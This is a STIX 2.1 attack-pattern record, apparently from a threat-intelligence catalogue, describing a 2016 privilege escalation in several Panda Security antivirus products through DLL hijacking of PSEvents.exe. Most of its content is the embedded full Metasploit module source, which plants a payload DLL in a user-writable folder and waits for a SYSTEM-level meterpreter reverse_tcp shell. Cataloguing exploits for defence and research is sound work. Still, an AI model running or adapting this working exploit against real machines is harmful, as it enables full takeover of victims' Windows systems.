{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed9b2996-204c-4b11-808e-8945a4361353",
    "created": "2024-08-14T16:48:55.493049Z",
    "modified": "2024-08-14T16:48:55.493053Z",
    "name": "Panda Security PSEvents Privilege Escalation",
    "description": " PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges. When run, it checks a user writable folder for certain DLL files, and if any are found they are automatically run. Vulnerable Products: Panda Global Protection 2016 (<=16.1.2) Panda Antivirus Pro 2016 (<=16.1.2) Panda Small Business Protection (<=16.1.2) Panda Internet Security 2016 (<=16.1.2)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/panda_psevents.rb",
            "external_id": "panda_psevents.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/Panda%20Security%20-%20Privilege%20Escalation.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.pandasecurity.com/uk/support/card?id=100053"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Exploit::FileDropper\n  include Post::File\n  include Msf::Post::Windows::Version\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Panda Security PSEvents Privilege Escalation',\n        'Description' => %q{\n          PSEvents.exe within several Panda Security products runs hourly with SYSTEM privileges.\n          When run, it checks a user writable folder for certain DLL files, and if any are found\n          they are automatically run.\n          Vulnerable Products:\n          Panda Global Protection 2016 (<=16.1.2)\n          Panda Antivirus Pro 2016 (<=16.1.2)\n          Panda Small Business Protection (<=16.1.2)\n          Panda Internet Security 2016 (<=16.1.2)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die <mike@shorebreaksecurity.com>', # Module,\n          'Security-Assessment.com' # discovery\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'payload' => 'windows/meterpreter/reverse_tcp',\n          'exitfunc' => 'seh'\n        },\n        'References' => [\n          [\n            'EDB', '40020',\n            'URL', 'http://www.security-assessment.com/files/documents/advisory/Panda%20Security%20-%20Privilege%20Escalation.pdf',\n            'URL', 'http://www.pandasecurity.com/uk/support/card?id=100053'\n          ]\n        ],\n        'DisclosureDate' => '2016-06-27'\n      )\n    )\n    register_options(\n      [\n        OptEnum.new('DLL', [\n          true, 'dll to create', 'cryptnet.dll',\n          ['cryptnet.dll', 'bcryptPrimitives.dll', 'CRYPTBASE.dll']\n        ]),\n        OptInt.new('ListenerTimeout', [true, 'Number of seconds to wait for the exploit', 3610]),\n      ]\n    )\n  end\n\n  def get_path\n    version = get_version_info\n    if version.build_number < Msf::WindowsVersion::Vista_SP0\n      return '%AllUsersProfile%\\\\Application Data\\\\Panda Security\\\\Panda Devices Agent\\\\Downloads\\\\1a2d7253f106c617b45f675e9be08171'\n    else # AllUsers directory changed as of Vista\n      return '%ProgramData%\\\\Panda Security\\\\Panda Devices Agent\\\\Downloads\\\\1a2d7253f106c617b45f675e9be08171'\n    end\n  end\n\n  def check\n    if directory?(get_path)\n      print_good('Vuln path exists')\n      CheckCode::Appears\n    else\n      vprint_error(\"#{get_path} doesn't exist on target\")\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    version = get_version_info\n    vprint_status(\"OS Detected as: #{version.product_name}\")\n\n    payload_filepath = get_path\n    payload_filepath = \"#{payload_filepath}\\\\#{datastore['DLL']}\"\n    upload_payload_dll(payload_filepath)\n\n    # start the hour wait\n    stime = Time.now.to_f\n    print_status 'Starting the payload handler, waiting for PSEvents.exe to process folder (up to an hour)...'\n    print_status \"Start Time: #{Time.now}\"\n    Rex.sleep(1) until session_created? || stime + datastore['ListenerTimeout'] < Time.now.to_f\n  end\n\n  def upload_payload_dll(payload_filepath)\n    payload = generate_payload_dll\n    print_status('Uploading the Payload DLL to the filesystem...')\n    begin\n      vprint_status(\"Payload DLL #{payload.length} bytes long being uploaded..\")\n      write_file(payload_filepath, payload)\n      register_file_for_cleanup(payload_filepath)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::Unknown, \"Error uploading file #{payload_filepath}: #{e.class} #{e}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-27",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}